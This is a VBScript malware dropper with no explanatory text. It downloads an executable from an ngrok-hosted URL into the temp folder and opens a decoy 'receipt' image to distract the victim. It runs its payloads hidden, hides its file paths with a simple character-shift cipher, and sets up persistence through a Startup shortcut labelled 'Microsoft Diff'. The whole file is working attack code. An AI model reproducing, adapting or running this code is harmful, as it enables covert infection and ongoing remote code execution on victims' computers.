 Dim fso, batFile, batPath, command

strFileName = "diff.bat"  
strTempFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\") & strFileName
strTempFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\") & strFileName
strTempFolder  = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\")
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists(strTempFolder ) Then    
    fso.CreateFolder(strTempFolder )
End If
Set batFile = fso.CreateTextFile(strTempFilePath , True)
strcmd = "@echo off" & vbCrLf & _
          "setlocal" & vbCrLf & _
          "set ""URL=https://robust-ocelot-moderately.ngrok-free.app/getfile""" & vbCrLf & _
	  "set ""TEMP_DIR=%TEMP%""" & vbCrLf & _
	  "set ""FILE_NAME=branch.exe""" & vbCrLf & _
	  "set ""FILE_PATH=%TEMP_DIR%\%FILE_NAME%""" & vbCrLf & _
	  "curl -L -o ""%FILE_PATH%"" ""%URL%""" & vbCrLf & _
	  "if %ERRORLEVEL% neq 0 (" & vbCrLf & _
	  " exit /b 1" & vbCrLf & _
	  ")" & vbCrLf & _
	  "endlocal"   
strcmd2 = "@echo off" & vbCrLf & _
          "setlocal" & vbCrLf & _
          "set ""URL1=https://robust-ocelot-moderately.ngrok-free.app/getpdf""" & vbCrLf & _
	  "set ""TEMP_DIR=%TEMP%""" & vbCrLf & _
	  "set ""FILE_NAME1=receipt.jpg""" & vbCrLf & _
	  "set ""FILE_PATH1=%TEMP_DIR%\%FILE_NAME1%""" & vbCrLf & _
	  "curl -L -o ""%FILE_PATH1%"" ""%URL1%""" & vbCrLf & _
	  "if %ERRORLEVEL% neq 0 (" & vbCrLf & _
	  " exit /b 1" & vbCrLf & _
	  ")" & vbCrLf & _
	  "start """" ""%FILE_PATH1%""" & vbCrLf & _   
	  "endlocal"   

batFile.WriteLine(strcmd)
batFile.WriteLine(strcmd2)
batFile.Close

Set fso = CreateObject("Scripting.FileSystemObject")
tempFolder = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
vbsFile = tempFolder & "\diff.vbs"
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile(vbsFile , True)
file.WriteLine("Set WshShell = CreateObject(""WScript.Shell"")")
file.WriteLine("localAppDataDir = WshShell.ExpandEnvironmentStrings(""%LOCALAPPDATA%"")")
file.WriteLine("obfLine = ""_Plfurvriw_Lqwhuphgldwh_gdwdsurfhvv1h{h""")
file.WriteLine("Function getString(input)")
file.WriteLine("    Dim output, i, char, ascii, new_ascii")
file.WriteLine("    output = """"")
file.WriteLine("    For i = 1 To Len(input)")
file.WriteLine("        char = Mid(input, i, 1)")
file.WriteLine("        ascii = Asc(char) Mod 256")
file.WriteLine("        new_ascii = (ascii - 3 + 256) Mod 256")
file.WriteLine("        output = output & Chr(new_ascii)")
file.WriteLine("    Next")
file.WriteLine("    getString = output")
file.WriteLine("End Function")
file.WriteLine("exeFilePath = localAppDataDir & getString(obfLine)")
file.WriteLine("WshShell.Run exeFilePath, 0, False") ' Run the executable silently
file.WriteLine("' Executable Path: ' & localAppDataDir & getString(obfLine)")
file.Close
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run strTempFilePath , 0, False  ' Change the second parameter to 0 to run hidden
tempFolder = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
vbsFile = tempFolder & "\msps.vbs"
' Create the file and write the content
With fso.CreateTextFile(vbsFile, True)
    .WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
    .WriteLine "localAppDataDir = WshShell.ExpandEnvironmentStrings(""%TEMP%"")"
    .WriteLine "appPath = localAppDataDir & ""\branch.exe"""
    .WriteLine "WshShell.Run appPath, 0, False"
    .Close
End With
WScript.Sleep 60000
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run vbsFile , 0, False  

Dim objShell, objShortcut, startupFolder, targetPath
Set objShell = CreateObject("WScript.Shell")
startupFolder = objShell.SpecialFolders("Startup")
strStartPath = "_Plfurvriw_Zlqgrzv_Vwduw#Phqx_Surjudpv_Vwduwxs"
localAppDataDir = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
Function getString(input)
    Dim output, i, char, ascii, new_ascii
    output = ""
    For i = 1 To Len(input)
        char = Mid(input, i, 1)
        ascii = Asc(char) Mod 256
        new_ascii = (ascii - 3 + 256) Mod 256
        output = output & Chr(new_ascii)
    Next
    getString = output
End Function
filePath = "_Plfurvriw_Lqwhuphgldwh_glii1yev"
targetPath = localAppDataDir + getString(filePath)   
Set objShortcut = objShell.CreateShortcut(startupFolder & "\diff.lnk")  
objShortcut.TargetPath = targetPath
objShortcut.WorkingDirectory = localAppDataDir  
objShortcut.Description = "Microsoft Diff"
objShortcut.Save
Set objShortcut = Nothing
Set objShell = Nothing
